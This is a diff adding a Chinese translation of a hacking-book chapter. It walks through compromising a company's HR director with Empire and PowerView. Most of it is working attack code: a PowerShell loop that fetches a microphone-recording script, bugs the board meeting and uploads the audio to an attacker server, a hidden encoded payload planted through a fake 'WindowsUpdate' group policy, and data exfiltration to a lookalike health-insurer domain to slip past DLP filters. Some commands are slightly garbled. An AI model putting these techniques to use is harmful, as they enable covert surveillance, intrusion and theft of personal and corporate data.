@@ -839,7 +839,241 @@ hiredate : 12/17/2016 12/:00:00 AM
 
 
 ### 董事会会议
-@116 page
+到目前为止，我们已经实现了名单上的三个目标中的两个。最后一个——潜入并伪装成对董事会成员——可能是最简单的一个，因为我们在公司内部已经有了如此广泛的触角。
+
+为了渗透董事会会议，我们只需要针对一个我们知道参加会议的成员。既然我们是在人力资源窗口领域，那么人力资源总监呢？在Active Directory中快速搜索会显示其详细信息：
+```
+(Empire: HRAgent) > usemodule usemodule situational_awareness/network/
+powerview/get_user
+(Empire: get_user) > set Filter description=*HR*
+(Empire: get_user) > run
+Job started: Debug32_br6of
+[…]
+description : HR Director
+displayname : Elise Jansen
+userprincipalname : ejansen@GBHR.CORP
+name : Elise Jansen
+objectsid : S-1-5-21-1930387874-2808181134-879091260-1117
+samaccountname : ejansen
+[…]
+```
+
+我们可以通过查看域控制器保存的连接日志来跟踪Elise的所有设备：
+```
+(Empire: HRAgent) > usemodule usemodule situational_awareness/network/
+powerview/user_hunter
+(Empire: user_hunter) > set UserName ejansen
+(Empire: user_hunter) > run
+```
+![](chap5/chap5-18.jpg)
+
+突然出现两台机器。我们可以同时瞄准这两个目标，但我很好奇是否需要使用两台计算机。Elise一个上面有敏感数据，另一个上面没有？SPHR0098是她的个人笔记本吗？
+
+让我们使用get_computer模块来获取关于它们的数据：
+```
+(Empire: HRAgent) > usemodule situational_awareness/network/powerview/
+get_computer
+(Empire: get_computer) > set ComputerName SPHR0098
+(Empire: get_computer) > set FullData True
+(Empire: get_computer) > run
+Job started: Debug32_myli4
+description : Surface PRO
+CN=SPHR0098,CN=Surface,CN=Computers,DC=GBHR,DC=CORP
+name : SPHHR0098
+[…]
+```
+
+当然！微软Surface Pro！所以另一个设备肯定是她的“普通”笔记本电脑。工作站可能用于办公室工作，而平板电脑可能用于旅行期间的快速笔记…或重要会议-董事会会议！我们有目标了！
+
+Surface Pro与任何传统工作站都依赖相同的Windows内核。我们可以快速扫描以查看是否有可用的端口：
+```
+(Empire: HRAgent) > usemodule situational_awareness/network/portscan
+(Empire: portscan) > use TopPorts 1000
+(Empire: portscan) > use Hosts SPHR0098.GBHR.CORP
+(Empire: portscan) > run
+portscan completed!
+```
+
+锁定！好吧，比最初预想的要复杂一点。我们没办法进去。还记得当我们谈到一些域设置时，这些设置有时是由域控制器推送的吗？
+
+如果我们可以配置一个设置：“如果您是机器X，那么执行此代码”怎么办？有可能吗？当然了。它甚至有一个名字：组策略对象（GPO）！
+
+我们的想法是创建一个GPO，它以HR的平板电脑为目标，并指示它执行一个随机的PowerShell脚本。事实上，不是那么随机。每当Elise登录并使用默认麦克风录制环境声音时，这个漂亮的代码就会启动。为了确保我们得到数据，它将每10分钟将数据推送到前置服务器。
+
+首先，我们从记录音频的PS脚本开始。我们通过@sixdub(参阅https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Exfiltration/Get-MicrophoneAudio.ps1)下载准备使用的powerspoit模块Get-MicroponeAudio，然后准备一个循环，每隔10分钟转储一次音频文件：
+```
+while($true)
+{
+$i++;
+$browser = New-Object System.Net.WebClient
+$browser.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;
+IEX($browser.DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Exfiltration/Get-MicrophoneAudio.ps1"));
+Get-MicrophoneAudio -path c:\users\ejansen\appdata\local\file$i.wav-Length 600
+}
+```
+
+这段代码将无休止地录制大约6MB的10分钟音频文件。录制完成后，我们需要上载文件，然后重新开始录制。
+
+为了避免在上载文件时丢失宝贵的秒数，我们需要将上载过程作为作业启动，以便它与实际脚本并行运行(参阅https://github.com/HackLikeAPornstar/GibsonBird/tree/master/chapter5)：
+```
+while($true)
+{
+    $i++;
+    $browser = New-Object System.Net.WebClient
+    $browser.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;
+    IEX($browser.DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Exfiltration/Get-MicrophoneAudio.ps1"));
+    Get-MicrophoneAudio -path c:\users\ejansen\appdata\local\file$i.wav-Length 600 start-job -Name Para$i -ArgumentList $i -ScriptBlock{ 
+        $i = $args[0];
+        $browser = New-Object System.Net.WebClient; 
+        $browser.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;
+        [System.Net.ServicePointManager]::ServerCertificateValidationCallback ={$true};
+        $browser.uploadFile("https://<frontgun_ip/", "c:\users\ejansen\appdata\local\file$i.wav");
+        }
+}
+```
+
+除了指示PowerShell接受自签名证书的SSL指令之外，没有什么新功能。实际上，我们选择使用可以快速获得的服务器（使用下面的python脚本设置）进行安全的文件传输。
+
+此脚本依赖于OpenSSL来加密传输的数据，因此我们首先需要生成一个自签名的SSL证书（或者更好的是，如果您不介意为前置服务器注册DNS名称(参阅https://letsencrypt.org/getting-started/)，则生成一个免费的可信Let'sEncrypt证书）：
+```
+root@FrontGun:~# openssl req -new -x509 -keyout server.pem -out
+server.pem -days 365 -nodes
+Generating a 2048 bit RSA private key
+..................................+++
+..................................+++
+writing new private key to 'server.pem'
+```
+
+![](chap5/chap5-19.jpg)
+
+太棒了！这个小动作非常有效！我们需要使用Base64编码将此脚本转换为一行代码，以便它可以放入GPO设置并配置到注册表项中：
+```
+PS> $command = get-content .\record.ps1
+PS> $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+PS> $encodedCommand = [Convert]::ToBase64String($bytes)
+PS> write-host $encodedCommand
+dwBoAGkAbABlACgAJAB0AHIAdQBlACkAIAB7ACAAIAAkAGkAKwArADsAIAA
+kAGIAcgBvAHcAcwBlAHIAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAF
+MAeQBzAHQAZQBtAC4ATgBlAHQALg...
+```
+
+要启动此代码，我们只需要执行以下命令:
+```
+Powershell.exe -NonI -W Hidden -enc aQBtAHAAbwByA[…]
+```
+
+攻击载荷已经准备好了，所以让我们专注于GPO创建过程。首先，我们在PowerShell中激活并导入组策略模块。我们将这些指令放在PS函数中，以便稍后通过代理轻松调用它们：
+```
+function initialize-gpo(){
+ Add-WindowsFeature GPMC
+ import-module group-policy
+ write-output "Initialization Done!"
+}
+```
+
+然后我们创建一个名为WindowsUpdate的新GPO，并以GBHR域控制器SR0088为目标。
+```
+Function create-gpo() {
+ New-GPo -name WindowsUpdate -domain GBHR.CORP -Server SR0088.GBSHR.CORP
+ 
+ #We only want to target Elise’s account on the computer SPHR0098, so we restrict the scope of this GPO:
+ Set-GPPermissions -Name "WindowsUpdate" -Replace -PermissionLevel 
+ 
+ GpoApply -TargetName "ejansen" -TargetType user Set-GPPermissions -Name "WindowsUpdate" -Replace -PermissionLevel  
+ GpoApply -TargetName " SPHR0098" -TargetType computer Set-GPPermissions -Name "WindowsUpdate" -PermissionLevel None -TargetName "Authenticated Users" -TargetType Group
+
+ #Finally, we link it to the GBHR domain to activate it:
+ New-GPLink -Name WindowsUpdate -Domain GBHR.CORP -Target "dc=gbhr,dc=corp" -order 1 -enforced yes
+
+ #We then instruct the GPO we created to set up a ‘Run’ registry key the next time Elise’s tablet polls new GPO settings (every 20 minutes).The ‘Run’ registry key automatically executes an executable or command at logon. We pass it the PS payload we prepared earlier:
+ Set-GPRegistryValue -Name "WindowsUpdate" -key "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName MSstart -Type String -value "
+ 
+ powershell.exe -NoP -sta -NonI -Enc aQBtAHAAbwByA […]"
+ write-output "Created GPO successfully!"
+ #End of create-gpo function
+}
+```
+
+我们使用模块scriptimport将此脚本加载到Empire代理的内存中，然后调用初始化函数安装GPO模块，然后调用create-gpo函数启动负载：
+```
+(Empire: HRAgent) > scriptimport /root/gpo.ps1
+gpo.ps1
+script successfully saved in memory
+(Empire: HRAgent) > scriptcmd initialize-gpo()
+Job started: Debug32_Apm02
+Initialization Done!
+Created GPO successfully!
+```
+
+文件会源源不断传送到前置服务器。要在作业完成后删除此GPO，我们只需发布：
+```
+PS> Remove-GPLink -Name WindowsUpdate -Target "OU=GBHR,dc=CORP"
+PS> Remove-GPO -Name "WindowsUpdate"
+```
+
+## 数据过滤
+从吉布森鸟信息系统中，我们收集了大量数据！千兆字节的销售数据，雇员工资数据，信用卡数据，和随处可见的共享目录内的文件。
+
+这确实是非常好的，但是除非我们能找到一种方法将其发送到一个安全的位置-前置服务器或一个虚拟的私人服务器，否则我们仍然有点被困住了。
+
+随着数据的过滤，必须密切注意两个关键点：
+- 我们要将数据传送到的地址：要使用哪个域？IP地址是否被列入黑名单？
+- 内容！如果GibsonBird碰巧在检查出口流量，而我们碰巧传输了包含敏感关键字的word文档，它将引发各种警报。
+
+内容问题很容易解决。我们只需压缩发送的每个文档，为了避免怀疑，我们将其转换为一个无意义的文本文件。
+
+假设我们要传输以下目录：c:\ users\elise\documents。首先，我们使用Empire模块压缩它：
+```
+(Empire: FTPSales) > usemodule management/zipfolder
+(Empire: zipfolder) > set Folder c:\users\ejansen\documents
+(Empire: zipfolder) > set ZipFileName documents.zip
+(Empire: zipfolder) > run
+Folder c:\users\ejansen\documents zipped to
+c:\users\ejansen\documents.zip
+```
+
+然后我们使用certutil-encode对其进行编码，以将此zip文档转换为文本文件（base64编码）：
+```
+(Empire: FTPSales) > shell certutil -encode documents.zip documents.txt
+(Empire: FTPSales) > 
+Input Length = 150
+Output Length = 264
+CertUtil: -encode command completed successfully.
+```
+
+很简单。现在关于要将数据渗出到的域。这就是我们需要变得更微妙的地方。一些公司依赖于可以对url进行分类的代理。
+
+例如，他们允许google.com，但会阻止drive.google.com或pastebin.com。我们可以赌一把，尝试为前置服务器设置一个随机的新域名？为什么不选择一个我们知道有更好的机会被白名单和信任的域名呢？
+
+在亚马逊注册一个专用服务器怎么样？这样我们就可以在amazonaws.com上找到一个合法的域名。我们不需要在它上面放任何数据；它可以将流量重定向到我们的前置服务器。
+
+此外，考虑到他们的免费分层计划，我们甚至不需要提供信用卡数据来租用服务器的有限时间。
+
+如果你对亚马逊不太放心，可能还有另一个有趣的选择。expiredomains.com网站提供了最近过期的域的列表。
+
+我们可以搜索已知的健康保险公司、银行网站和其他最近倒闭的值得信赖的服务，并尝试购买它们。我们不一定需要一个*.com网站；只要受信任服务的名称在URL中，它就很可能绕过大多数白名单工具。
+
+![](chap5/chap5-20.jpg)
+
+
+美国最大的健康保险公司CVS Health怎么样？应该这样做。注册域并将其分配给前置服务器后，我们可以像以前一样在其上设置一个简单的HTTPs python服务器：
+```
+root@FrontGun: # python simpleHTTPsUpload.py
+```
+
+然后使用以下PowerShell命令传输document.txt文件。
+```
+PS> $browser = New-Object System.Net.WebClient;
+PS> $browser.Proxy.Credentials
+=[System.Net.CredentialCache]::DefaultNetworkCredentials;
+$browser.uploadFile("https://cvshealth.co.in", "
+c:\users\ejansen\documents.txt");
+```
+
+就这样，伙计们！永远不要被新奇的数据防泄漏（DLP）系统打动。它们只是另一种赚钱的营销工具。
+
+一旦我们得到了数据，我们总能找到一种方法把它弄出来！
+
 
 
 
